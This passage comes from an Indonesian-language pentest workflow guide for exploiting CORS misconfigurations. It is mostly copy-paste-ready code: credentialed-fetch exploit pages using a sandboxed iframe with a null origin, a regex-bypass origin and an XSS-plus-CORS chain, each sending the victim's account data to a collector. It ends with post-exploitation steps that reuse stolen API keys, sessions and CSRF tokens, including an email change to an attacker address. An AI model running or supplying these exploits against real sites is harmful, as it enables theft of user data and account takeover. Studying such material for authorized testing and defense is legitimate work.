        output.textContent = "[+] DATA DICURI!\n" + event.data.text;
        
        // Kirim ke collector
        fetch("http://127.0.0.1:9001/?null_cors=" + encodeURIComponent(event.data.text), {
            mode: "no-cors"
        });
    } else {
        output.textContent = "[-] Error: " + (event.data?.error || "unknown");
    }
});
</script>

<!-- Sandboxed iframe menghasilkan Origin: null -->
<iframe
    sandbox="allow-scripts"
    srcdoc='
<!doctype html>
<html>
<body>
<script>
(async () => {
    // GANTI: URL target lab
    const target = "https://lab.example/api/account";
    try {
        const response = await fetch(target, {
            credentials: "include"
        });
        const text = await response.text();
        parent.postMessage({ ok: true, text: text }, "*");
    } catch (error) {
        parent.postMessage({ ok: false, error: String(error) }, "*");
    }
})();
<\/script>
</body>
</html>
'>
</iframe>

</body>
</html>
EXPLOIT

echo "[*] PoC dibuat: ~/cors_loot/poc/cors_null.html"
echo "[*] Buka: http://127.0.0.1:8000/cors_null.html"
```

**OUTPUT BERHASIL ✅:**

text

```
[+] DATA DICURI!
{"username":"alice","email":"alice@example.test","role":"admin"}
```

➡️ Collector menerima data. **Confirmed!**

**OUTPUT GAGAL ❌ — iframe tidak kirim pesan:**

text

```
[-] Error: TypeError: Failed to fetch
```

➡️ Kemungkinan:

1. Server tidak trust `null` origin → kembali ke Fase 1, test origin lain
2. Cookie `SameSite=Strict` atau `Lax` → credential tidak terkirim dari iframe
3. Mixed content (HTTP iframe → HTTPS API)

Bash

```
# Cek cookie attributes di response
curl -si "$TARGET_API/api/account" | grep -i "set-cookie"
# Lihat: SameSite=None; Secure? Kalau bukan, credential tidak bisa cross-site
```

---

### PATH C — Exploit: Regex Bypass

> Prasyarat: Fase 1.3 menemukan bypass (misal suffix attack `example.com.evil.com`)

Bash

```
# Tentukan bypass origin yang berhasil
BYPASS_ORIGIN="https://example.com.evil.com"

# Setup /etc/hosts agar bisa host dari bypass origin
echo "127.0.0.1 example.com.evil.com" | sudo tee -a /etc/hosts

cat > ~/cors_loot/poc/cors_regex_bypass.html << 'EXPLOIT'
<!doctype html>
<html>
<head><title>CORS Regex Bypass</title></head>
<body>
<h1>CORS — Regex Bypass PoC</h1>
<pre id="out">Loading...</pre>
<script>
(async () => {
    // GANTI: target dan collector
    const target = "https://lab.example/api/account";
    const collector = "http://127.0.0.1:9001/";
    
    const out = document.getElementById("out");
    try {
        const r = await fetch(target, { credentials: "include" });
        const text = await r.text();
        out.textContent = "[+] " + text;
        
        // Exfil
        await fetch(collector + "?data=" + encodeURIComponent(text), { mode: "no-cors" });
    } catch(e) {
        out.textContent = "[-] " + e;
    }
})();
</script>
</body>
</html>
EXPLOIT

# Serve dari bypass origin
echo "[*] Serve PoC dari: $BYPASS_ORIGIN"
echo "[*] Buka: http://example.com.evil.com:8000/cors_regex_bypass.html"
python3 -m http.server 8000 --bind 127.0.0.1
```

---

### PATH D — Exploit: Trusted Subdomain + XSS Chain

> Prasyarat: Trusted subdomain ditemukan DAN ada XSS di subdomain tersebut

Bash

```
# Step 1: Konfirmasi subdomain yang trusted
TRUSTED_SUB="evil.example.com"

curl -si "$TARGET_API/api/account" \
    -H "Origin: https://$TRUSTED_SUB" \
    -H "$SESSION" | grep -i "access-control"
```

**OUTPUT BERHASIL ✅:**

text

```
Access-Control-Allow-Origin: https://evil.example.com
Access-Control-Allow-Credentials: true
```

Bash

```
# Step 2: Temukan XSS di subdomain
# (Refer ke [🔥 20 — XSS Workflow](/docs/xss) untuk full XSS testing)
# Asumsikan XSS di: https://evil.example.com/search?q=PAYLOAD

# Buat payload XSS yang melakukan CORS attack
XSS_PAYLOAD='<script>
fetch("https://api.example.com/api/account",{credentials:"include"})
.then(r=>r.text())
.then(d=>fetch("http://127.0.0.1:9001/?xss_cors="+encodeURIComponent(d),{mode:"no-cors"}))
</script>'

# URL encode payload
python3 -c "import urllib.parse; print(urllib.parse.quote('$XSS_PAYLOAD'))"

# Trigger XSS
# URL: https://evil.example.com/search?q=ENCODED_PAYLOAD
```

**OUTPUT BERHASIL ✅ — Collector menerima data:**

text

```
# Di terminal collector:
127.0.0.1 - "GET /?xss_cors=%7B%22role%22%3A%22admin%22...
```

➡️ **Chain XSS + CORS berhasil!**

**OUTPUT GAGAL ❌ — XSS tidak ada di subdomain:**

text

```
[Tidak menemukan XSS setelah testing]
```

➡️ Coba:

1. Cari subdomain trusted lain yang mungkin ada XSS
2. Cari subdomain takeover (`dig CNAME evil.example.com` → apakah mengarah ke platform yang bisa di-claim?)
3. Google: `site:evil.example.com` untuk cari halaman dengan input

Bash

```
# Cek subdomain takeover
dig CNAME $TRUSTED_SUB
# Jika mengarah ke: *.azurewebsites.net, *.github.io, dll → cek apakah bisa di-claim
```

---

## ═══════════════════════════════════════

## FASE 4: AUTOMATED SCANNING

## ═══════════════════════════════════════

### Langkah 4.1 — Corsy (Python Tool)

Bash

```
# Setup Corsy
mkdir -p ~/tools/corsy
cd ~/tools/corsy
python3 -m venv .venv
source .venv/bin/activate
pip install corsy 2>/dev/null || \
    pip install git+https://github.com/s0md3v/Corsy.git 2>/dev/null

# Scan single URL
corsy -u "$TARGET_API/api/account" -t 10 -q

# Scan multiple endpoints
corsy -i ~/cors_loot/api_endpoints.txt -t 10 -q \
    --headers "Cookie: $SESSION" \
    -o ~/cors_loot/corsy_results.json
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Target: https://api.example.com/api/account
[+] Testing Origin: https://evil.example
[+] Access-Control-Allow-Origin: https://evil.example
[+] Access-Control-Allow-Credentials: true
[!] Potentially Vulnerable CORS Configuration
    Type: origin_reflection
```

**OUTPUT GAGAL ❌ — Not vulnerable:**

text

```
[-] Not vulnerable: https://api.example.com/api/account
```

➡️ Coba endpoint lain, atau test manual dengan variasi yang corsy mungkin tidak cover.

> **⚠️ INGAT:** Output scanner bukan final verdict. Selalu validate manual di browser!

---

### Langkah 4.2 — Burp Scanner (Jika Burp Pro)

text

```
Burp Suite → Dashboard → New Scan
→ Scan type: Crawl and Audit
→ URL: TARGET_API
→ Audit checks: include "CORS"
→ Start
```

**ACAO scanner di Burp:**

text

```
Issues → Cross-origin resource sharing
→ Lihat detail, request, response
```

---

## ═══════════════════════════════════════

## FASE 5: VALIDASI DI BROWSER (WAJIB)

## ═══════════════════════════════════════

### Langkah 5.1 — Buka DevTools & Verifikasi

text

```
1. Buka browser (Firefox/Chrome)
2. Buka PoC yang sudah dibuat (Fase 3)
3. F12 → Console tab
4. F12 → Network tab
5. Lihat apakah fetch berhasil
6. Lihat apakah response terbaca
```

**Output Console yang diharapkan (BERHASIL ✅):**

JavaScript

```
// Tidak ada error CORS di console
// Response terbaca di <pre id="output">
```

**Output Console jika GAGAL ❌:**

text

```
Access to fetch at 'https://...' from origin 'http://127.0.0.1:8000'
has been blocked by CORS policy: The 'Access-Control-Allow-Origin' header
has a value 'https://evil.example' that is not equal to the supplied origin.
```

➡️ Origin yang dipakai PoC tidak cocok. Pastikan kamu serve PoC dari origin yang sama dengan yang diterima server.

---

### Langkah 5.2 — Network Tab Analysis

text

```
DevTools → Network → pilih request ke API
→ Request Headers: lihat Origin: ...
→ Response Headers: lihat Access-Control-Allow-Origin: ...
→ Response: lihat isi body (jika CORS allowed)
```

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION & CROSS-SERVICE

## ═══════════════════════════════════════

### Langkah 6.1 — Data yang Dicuri → Pivot ke Service Lain

Bash

```
# Jika dapat API key dari CORS exploit:
STOLEN_API_KEY="sk-prod-abc123..."

# Test API key ke service lain
curl -H "Authorization: Bearer $STOLEN_API_KEY" "$TARGET_API/api/admin/users"
curl -H "X-API-Key: $STOLEN_API_KEY" "$TARGET_API/api/admin/settings"

# Jika dapat session token:
STOLEN_SESSION="session=STOLEN_VALUE"
curl -si "$TARGET_API/api/admin" -H "$STOLEN_SESSION"
```

### Langkah 6.2 — Cross-Workflow: CORS → Auth Bypass

text

```
CORS Data Theft dapat mengekspos:
│
├─ ─→ API Key           → <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
├──→ OAuth Token       → <a href="/docs/oauth-sso" class="text-[#00b4d8] hover:underline font-mono font-semibold">34_oauth_sso_workflow.md</a>
├──→ Admin Session     → <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
├──→ CSRF Token        → <a href="/docs/csrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">29_csrf_workflow.md</a> (gunakan token yang dicuri)
└──→ JWT Token         → <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>
```

Bash

```
# Jika dapat CSRF token via CORS:
STOLEN_CSRF="csrf_token=STOLEN_VALUE"

# Gunakan untuk bypass CSRF protection
curl -X POST "$TARGET/account/change-email" \
    -H "$SESSION" \
    -H "$STOLEN_CSRF" \
    -d "new_email=attacker@evil.com"
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSI

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`CORS policy blocked` di browser|Origin PoC ≠ origin yang diterima server|Serve PoC dari origin yang direflect, edit `/etc/hosts`|
|`ACAO: *` tapi fetch credential gagal|Browser blokir wildcard + credential|`*` tidak bisa untuk credentialed read — expected behavior|
|Response kosong di JS|SameSite cookie blokir credential|Cek cookie attributes, mungkin `SameSite=Lax/Strict`|
|Preflight 403|Server blokir OPTIONS|Test jika endpoint bisa simple request (GET tanpa custom header)|
|`curl` bilang vulnerable tapi browser tidak|`curl` tidak enforce CORS|Validasi selalu di browser|
|Null origin tidak bekerja|Cookie tidak masuk ke sandboxed iframe|Cek `SameSite` attribute; Lax/Strict blokir dari iframe|
|Subdomain trusted tapi exploit gagal|Subdomain bukan attacker-controlled|Cari XSS atau subdomain takeover|
|Collector tidak terima data|Mixed content block / CORS di collector|Gunakan HTTPS collector atau Burp Collaborator|
|Scanner bilang vuln tapi manual tidak|False positive|Manual validation di browser = ground truth|
|`TypeError: Failed to fetch`|Network issue / endpoint down|`curl -v` dulu untuk debug|
|Response ada tapi `undefined`|Response bukan JSON|Gunakan `.text()` bukan `.json()`|
|Regex bypass tidak diterima|Regex sebenarnya strict/anchored|Test lebih banyak variasi, cek source code jika tersedia|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Target API Ditemukan
│
├─ FASE 0: Recon
│   ├─ Spider → temukan endpoint
│   └─ Identifikasi endpoint sensitif
│
├─ FASE 1: CORS Detection
│   ├─ Test evil origin → ACAO reflect? → CASE A (HIGH)
│   ├─ Test null origin → ACAO null? → CASE B (HIGH)
│   ├─ Test wildcard → ACAO: * → CASE C (check sensitive?)
│   ├─ Test subdomain → trusted? → CASE D
│   └─ Regex bypass → CASE E
│
├─ FASE 2: Analisis
│   ├─ ACAC:true + sensitive data → HIGH priority
│   └─ Wildcard only → LOW/INFO
│
├─ FASE 3: Exploitation
│   ├─ PATH A: Reflection + Credentials → HTML PoC
│   ├─ PATH B: Null Origin → Sandboxed iframe PoC
│   ├─ PATH C: Regex Bypass → Serve dari bypass origin
│   └─ PATH D: Subdomain + XSS → Chain attack
│
├─ FASE 4: Automated (Corsy, Burp)
│   └─ Konfirmasi & temukan endpoint baru
│
├─ FASE 5: Browser Validation (WAJIB)
│   └─ Ground truth = browser behavior
│
└─ FASE 6: Post-Exploitation
    ├─ Stolen API key → <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
    ├─ Stolen OAuth token → <a href="/docs/oauth-sso" class="text-[#00b4d8] hover:underline font-mono font-semibold">34_oauth_sso_workflow.md</a>
    └─ Stolen CSRF token → <a href="/docs/csrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">29_csrf_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET_API="https://api.example.com"
export SESSION="Cookie: session=LAB_SESSION"
mkdir -p ~/cors_loot/{poc,collector,responses}

# === DETECTION ===
curl -si "$TARGET_API/api/account" -H "Origin: https://evil.example" -H "$SESSION" | grep -i "access-control"
curl -si "$TARGET_API/api/account" -H "Origin: null" -H "$SESSION" | grep -i "access-control"

# === DETECTION SCRIPT ===
for origin in "https://evil.example" "null" "http://example.com" "https://evil.example.com" "https://example.com.evil.com" "https://evilexample.com"; do
    result=$(curl -si "$TARGET_API/api/account" -H "Origin: $origin" -H "$SESSION" | grep -i "access-control-allow-origin")
    echo "Origin: $origin -> $result"
done

# === SETUP SERVERS ===
cd ~/cors_loot/poc && python3 -m http.server 8000 &
cd ~/cors_loot/collector && python3 -m http.server 9001 &

# === AUTOMATED ===
corsy -u "$TARGET_API/api/account" -t 10 --headers "$SESSION"

# === DECODE STOLEN DATA ===
python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "ENCODED_DATA"

# === PREFLIGHT TEST ===
curl -si "$TARGET_API/api/account" -X OPTIONS \
    -H "Origin: https://evil.example" \
    -H "Access-Control-Request-Method: DELETE" \
    -H "Access-Control-Request-Headers: Authorization"
```

---

> **Muscle Memory:** `Find API → Add Origin → Read ACAO/ACAC → Classify → Browser PoC → Sensitive Data → Impact`
> 
> **Golden Rule:** `curl ≠ browser`. CORS adalah browser-enforced policy. Selalu validasi di browser!
> 
> **➡️ PREV:** `[32 — Deserialization Workflow 🔐](/docs/deserialization)`  
> **➡️ NEXT:** `[🔐 34 — OAuth & SSO Workflow](/docs/oauth-sso)` — Setelah dapat OAuth/access token via CORS, gunakan untuk OAuth attack chain.